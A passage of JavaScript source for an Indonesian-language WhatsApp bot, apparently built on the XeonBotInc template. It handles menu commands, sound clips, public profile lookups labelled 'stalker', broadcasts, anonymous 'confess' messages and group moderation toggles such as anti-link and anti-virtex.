sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${stalkermenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomphotomenu': {
var unicorn = await getBuffer(picak+'Random Pic Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${randphotomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'randomvideomenu': {
var unicorn = await getBuffer(picak+'Random Vid Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${randvideomenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'textpromenu': {
var unicorn = await getBuffer(picak+'Textpro Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${textpromenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'photooxymenu': {
var unicorn = await getBuffer(picak+'Photooxy Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${photooxymenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'ephoto360menu': {
var unicorn = await getBuffer(picak+'Photo360 Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${ephoto360menu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'nsfwmenu': {
var unicorn = await getBuffer(picak+'Anime NSFW Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${nsfwmenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'animemenu': {
var unicorn = await getBuffer(picak+'Anime Menu')
sendXeonBotIncMessage(from, { 
text: `Hai 👋 @${sender.split("@")[0]}\n\n${animemenu(prefix)}`,
mentions:[sender],
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
XeonBotInc_dev = await getBuffer(`https://github.com/Keizha/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await XeonBotInc.sendMessage(m.chat, { audio: XeonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'searchfriend':{
let teman = pickRandom(xeonverifieduser)
setTimeout(() => {
replygcxeon(mess.wait)
}, 1000)
setTimeout(() => {
replygcxeon('*Berhasil Mendapatkan Satu Orang*')
}, 5000)
setTimeout(() => {
XeonBotInc.sendMessage(from, {text: `*Disini @${teman.split("@")[0]}*`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'bvvvq': case 'quhhvoted': {
if (!m.quoted) return replygcxeon('*Balas pesan*')
let xeonquotx= await XeonBotInc.serializeM(await m.getQuotedObj())
if (!xeonquotx.quoted) return replygcxeon('*Pesan yang Anda balas tidak diposting oleh bot*')
await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'jsjshbs': {
  if (!text) {
    replygcxeon(`Format: *${prefix + command} Teks*`);
  } else {
    try {
      let tts = await fetchJson(`https://api.akuari.my.id/texttovoice/texttosound_id?query=${encodeURIComponent(text)}`);
      if (tts.success) {
        XeonBotInc.sendMessage(m.chat, { audio: { url: tts.result }, mimetype: 'audio/mp4', ptt: true, fileName: `${text}.mp3` }, { quoted: m });
      } else {
        replygcxeon('*Gagal membuat TTS*');
      }
    } catch (error) {
      console.error(error);
      replygcxeon('*Terjadi Kesalahan Saat Memproses Permintaan*');
    }
  }
}
break;         
case 'igstalk':{
if (!q) return replygcxeon(`Contoh: *${prefix+command} is_keizha*`)
replygcxeon(mess.wait)
aj = await igstalk(`${q}`)
XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile }, caption: 
`*INSTAGRAM STALKER*

Nama Lengkap: *${aj.fullname}*
Nama Pengguna: *${aj.username}*
Pos: *${aj.post}*
Pengikut: *${aj.followers}*
Mengikuti: *${aj.following}*
Bio: *${aj.bio}*` }, { quoted: m } )
}
break
case 'ffstalk':{
if (!q) return replygcxeon(`Contoh: *${prefix+command} 946716486*`)
replygcxeon(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
replygcxeon(`*FREE FIRE STALKER*

ID: *${eeh.id}*
Nama Panggilan: *${eeh.nickname}*`)
}
break
case 'mlstalk': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return replygcxeon(`Contoh: *${prefix+command} 530793138|8129*`)
replygcxeon(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
replygcxeon(`*MOBILE LEGEND STALKER*

Nama Pengguna: *${dat.userName}*
ID: *${q.split("|")[0]}*
ID Zona: *${q.split("|")[1]}*`)
}
break
case 'npmstalk':{
if (!q) return replygcxeon(`Contoh: *${prefix+command} Keizha*`)
replygcxeon(mess.wait)
eha = await npmstalk.npmstalk(q)
replygcxeon(`*NPM STALKER*

Nama: *${eha.name}*
Versi Terbaru: *${eha.versionLatest}*
Publikasikan Versi: *${eha.versionPublish}*
Pembaruan Versi: *${eha.versionUpdate}*
Ketergantungan Terbaru: *${eha.latestDependencies}*
Publikasikan Ketergantungan: *${eha.publishDependencies}*
Publikasikan Waktu: *${eha.publishTime}*
Waktu Publikasi Terbaru: *${eha.latestPublishTime}*`)
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replygcxeon(`Contoh: *${prefix+command} Keizha*`)
replygcxeon(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
XeonBotInc.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*GITHUB STALKER*

Nama Pengguna: *${aj.username}*
Nama Panggilan: *${aj.nickname}*
Bio: *${aj.bio}*
ID: *${aj.id}*
ID Node: *${aj.nodeId}*
URL Profik: *${aj.profile_pic}*
URL Github: *${aj.url}*
Tipe: *${aj.type}*
Admin: *${aj.admin}*
Perusahaan: *${aj.company}*
Blog: *${aj.blog}*
Lokasi: *${aj.location}*
E-Maik: *${aj.email}*
Repo Publik: *${aj.public_repo}*
Inti Publik: *${aj.public_gists}*
Pengikut: *${aj.followers}*
Mengikuti: *${aj.following}*
Dibuat Pada: *${aj.ceated_at}*
Diperbarui Pada: *${aj.updated_at}*` }, { quoted: m } )
}
break
case 'ss': case 'ssweb': {
if (!q) return replygcxeon(`Format: *${prefix+command} Tautan*`)
replygcxeon(mess.wait)
let krt = await scp1.ssweb(q)
XeonBotInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'hvcc': {
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (!text) return replygcxeon(`Format: *${prefix+command} Tautan*`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcxeon('*Tautan Tidak Sah*')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await XeonBotInc.groupAcceptInvite(result).then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
}
break
case 'toonce':
case 'toviewonce': {
  if (!quoted) {
    replygcxeon('Balas Gambar Atau Vidio Dengan: .toonce *Keterangan*');
    break;
  }

  const caption = args.join(' ');

  if (/image/.test(mime)) {
    const anuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
    XeonBotInc.sendMessage(m.chat, { image: { url: anuan }, caption: caption || '*Lihatlah*', fileLength: '999', viewOnce: true }, { quoted: m });
  } else if (/video/.test(mime)) {
    const anuanuan = await XeonBotInc.downloadAndSaveMediaMessage(quoted);
    XeonBotInc.sendMessage(m.chat, { video: { url: anuanuan }, caption: caption || '*Lihatlah*', fileLength: '99999999', viewOnce: true }, { quoted: m });
  }
  
  break;
}
case 'fliptext': {
if (args.length < 1) return replygcxeon(`Contoh: *${prefix}fliptext Keizha*`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replygcxeon(`\`\`\`「 TEKS DIBALIK 」\`\`\`\n*Normal:*\n${quere}\n*Dibalik:*\n${flipe}`)
}
break
            case 'hhvc': {
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *DAFTAR OBROLAN PRIBADI*\n\nTotal Obrolan: *${anulistp.length} Obrolan*\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Nama:* ${nama}\n${themeemoji} *Pengguna:* @${i.split('@')[0]}\n${themeemoji} *Obrloan:* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'ccfg': {
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *DAFTAR OBROLAN GRUP*\n\nTotal Grup: *${anulistg.length} Grup*\n\n`
                 for (let i of anulistg) {
                     let metadata = await XeonBotInc.groupMetadata(i)
                     teks += `${themeemoji} *Nama:* ${metadata.subject}\n${themeemoji} *Pemilik:* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID:* ${metadata.id}\n${themeemoji} *Dibuat Pada:* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Anggota:* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'hhcc': case 'hfxx': case 'ggggcj': case 'gggg': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Tanggapan *${latensi.toFixed(4)}* Detik\n*${oldd - neww}* Milidetik\n\nWaktu Proses: *${runtime(process.uptime())}*

💻 Info Server
RAM: *${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}*

_Penggunaan Memori NodeJS_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Penggunaan CPU Total_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_Penggunaan Inti CPU (${cpus.length} CPU Inti)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                replygcxeon(respon)
            }
            break
case 'autosticker':
if (!XeonTheCreator) return replygcxeon(mess.owner)
if (args[0] == 'on') {
if (autosticker) return replygcxeon('*Diaktifkan*')
autosticker = true
replygcxeon('*Auto-Stiker Berhasil Diaktifkan*')
} else if (args[0] == 'off') {
if (!autosticker) return replygcxeon('*Belum Aktif*')
autosticker = false
replygcxeon('*Berhasil Mematikan Auto-Stiker*')
} else {
replygcxeon(`*.autosticker on* - Untuk Mengaktifkan\n*.autosticker off* - Untuk Menonaktifkan`)
}
break
            case 'bctext': case 'broadcasttext': case 'broadcast': {
			    if (!XeonTheCreator) return replygcxeon(mess.owner)
		            if (!q) return replygcxeon(`*Masukkan Teks*`)
		                            const data = await store.chats.all()
                            for (let i of data) {
                               XeonBotInc.sendMessage(i.id, {text: `*SIARAN 🛰️*\n\n✉️ Pesan:\n${q}` })
                               await sleep(1000)
                            }
                            }
                            break
                            case 'broadcastimage': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!XeonTheCreator) return replygcxeon(mess.owner)
        if (!q) return replygcxeon(`Enter text`)
        let getGroups = await XeonBotInc.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        replygcxeon(`*Menyiarkan Siaran Di ${xeoncast.length} Grup, Dalam Waktu ${xeoncast.length * 1,5} Detik*`)
        for (let i of xeoncast) {
let txt = `*SIARAN 🛰️*\n\n✉️ Pesan:\n${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await XeonBotInc.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        replygcxeon(`*Berhasil Disiarkan Di ${xeoncast.length} Grup*`)      
        break
case 'block': {
		if (!XeonTheCreator) return replygcxeon(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'block').then((res) => replygcxeon(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!XeonTheCreator) return replygcxeon(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => replygcxeon(jsonformat(res))).catch((err) => replygcxeon(jsonformat(err)))
	}
	break
case 'jhvf': case 'hgc': case 'hgc': case 'vvg': {
	const lisben = "Total Blok: " + banUser.length
	replygcxeon(lisben)
	}
	break
case 'nebjsis': case 'bwvgahsus':
if (Object.values(anon.anonymous).find(p => p.check(sender))) return replygcxeon("You are still in the room")
if (m.isGroup) return replygcxeon(mess.private)
if (args.length < 1) return replygcxeon(`Format: *${prefix+command} Nomor|Pesanmu*\nContoh: *${prefix+command} ${ownernumber}|Hai Keizha*`)
if (text > 700) return replygcxeon(`*Maksimal 700 Karakter*`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
pesan = q.split('|')[1]
let cekno = await XeonBotInc.onWhatsApp(num)
if (cekno.length == 0) return replygcxeon(`*Masukkan Nomor WhatsApp Terdaftar & Sah*`)
if (num === m.sender) return replygcxeon(`*Tidak Dapat Confess/Menfess Ke Pemilik Bot*`)
if (num === botNumber) return replygcxeon(`*Tidak Dapat Confess/Menfess Ke Bot*`)
var nomor = m.sender

const xeonconfesmsg = `*Hai, Saya Bot. Seseorang Mengirimkan Pesan Kepada Anda.*

✉️ Pesan: 
*${pesan}*`

await XeonBotInc.sendMessage(num,
{ text: xeonconfesmsg,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": ``,
"sourceUrl": `${wagc}`}}}, {quoted:m})

await XeonBotInc.sendMessage(num, {text:`Anda juga bisa membalas pesan dengan memposting pesan, jika tidak ingin membalas silahkan ketik .leave dan tekan tombol posting`}, { quoted : m })
lidt = `Sukses Mengirim Pesan
👤 Dari: *wa.me/${nomor.split("@s.whatsapp.net")[0]}*
👥 Untuk: *wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}*

✉️ Pesanmu:
*${pesan}*`
var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
if (!check) {
anon.createRoom(sender, num)
console.log("[ CONFESS ] Creating room for: " + sender);
return replygcxeon(lidt)
}
break
case 'hgccc':{
if (m.isGroup && XeonTheCreator && command == "leave") return XeonBotInc.groupLeave(from)
if (m.isGroup) return replygcxeon("*Hanya Digunakan Di Obrolan Pribadi*")
var room = Object.values(anon.anonymous).find(p => p.check(sender))
if (!room) return replygcxeon("*Anda Tidak Berada Di Sesi Confess/Menfess*")
replygcxeon("*Selamat Tinggal...*")
var other = room.other(sender)
delete anon.anonymous[room.id]
if (other != "") XeonBotInc.sendMessage(other, {
text: "*Selamat Tinggal...*"
})
if (command == "leave") break;
}
case 'ajhabwvvwjsjx': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!text) return replygcxeon(`Format: ${prefix+command} *Alasan*`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
replygcxeon(`*${m.pushName} Sedang Mode AFK*\nAlasan: *${args.join(" ") ? args.join(" ") : ''}*`)
}
break
case 'jhgc': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
XeonBotInc.groupRevokeInvite(m.chat)
}
break
            case 'react': {
                if (!XeonTheCreator) return replygcxeon(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                XeonBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
case 'ugfc': case 'hgcc': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!q) return replygcxeon(`Format: *.${command} Opsi*\nContoh: *.${command} close*\n\nOpsi Tersedia: *close & open*`)
if (args[0] == 'close') {
XeonBotInc.groupSettingUpdate(from, 'announcement')
replygcxeon(`*Sukses Mengizinkan Hanya Admin Yang Mengirim Pesan Ke Grup Ini*`)
} else if (args[0] == 'open') {
XeonBotInc.groupSettingUpdate(from, 'not_announcement')
replygcxeon(`*Sukses Mengizinkan Semua Peserta Mengirim Pesan Ke Grup Ini*`)
} else {
replygcxeon(`Format: *.${command} Opsi*\nContoh: *.${command} close*\n\nOpsi Tersedia: *close & open*`)
}}
break
case 'autostickergc':
            case 'autosticker':
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args.length < 1) return replygcxeon('*.autosticker on* - Untuk Mengaktifkan\n*.autosticker off* - Untuk Menonaktifkan')
if (args[0]  === 'on'){
if (isAutoSticker) return replygcxeon(`*Telah Diaktifkan*`)
autosticker.push(from)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('*Auto-Stiker Diaktifkan*')
} else if (args[0] === 'off'){
let anuticker1 = autosticker.indexOf(from)
autosticker.splice(anuticker1, 1)
fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker))
replygcxeon('*Auto-Stiker Dinonaktifkan*')
}
break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (antiVirtex) return replygcxeon('*Sudah Diaktifkan*')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('*Sukses Menyalakan Anti-Virus Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Virus Akan Ditendang.*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replygcxeon('*Sukses Menonaktifkan Anti-Virus Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Virus\n*${prefix + command} off* - Untuk Menonaktifkan Anti Virus`)
  }
  }
  break
case 'nsfw': {
if (!m.isGroup) return
if (!isBotAdmins) return
if (!isAdmins && !XeonTheCreator) return
if (args[0] === "on") {
if (AntiNsfw) return
ntnsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*NSFW Telah Diaktifkan Digrup Ini, Peserta Dapat Mengakses Grafik Seksual*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(ntnsfw))
} else {
  await replygcxeon(`*Not safe for work (NSFW) adalah bahasa gaul atau slang Internet yang digunakan untuk menandai tautan ke konten, video, atau halaman website yang mungkin tidak ingin dilihat oleh pemirsa di lingkungan publik, formal, atau terkontrol.*`)
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replygcxeon('*Sudah Diaktifkan*')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Vidio Youtube Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Vidio Youtube Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replygcxeon('*Sukses Menonaktifkan Anti Tautan Vidio Youtube  Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Vidio Youtube\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Vidio Youtube`)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replygcxeon('*Sudah Diaktifkan*')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replygcxeon('*Sukses Mengaktifkan Anti Tautan Saluran Youtube Di Grup Ini*')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 PERINGATAN 」\`\`\`\n\n*Sekarang Peserta Yang Memposting Tautan Saluran Youtube Akan Ditendang*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replygcxeon('*Sudah Dinonaktifkan*')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replygcxeon('*Sukses Menonaktifkan Anti Tautan Saluran Youtube Di Grup Ini*')
} else {
  await replygcxeon(`*${prefix + command} on* - Untuk Mengaktifkan Anti Tautan Saluran Youtube\n*${prefix + command} off* - Untuk Menonaktifkan Anti Tautan Saluran Youtube`)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return replygcxeon(mess.group)
if (!isBotAdmins) return replygcxeon(mess.botAdmin)
if (!isAdmins && !XeonTheCreator) return replygcxeon(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return replygcxeon('*Sudah Diaktifkan*')
ntilinkig.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
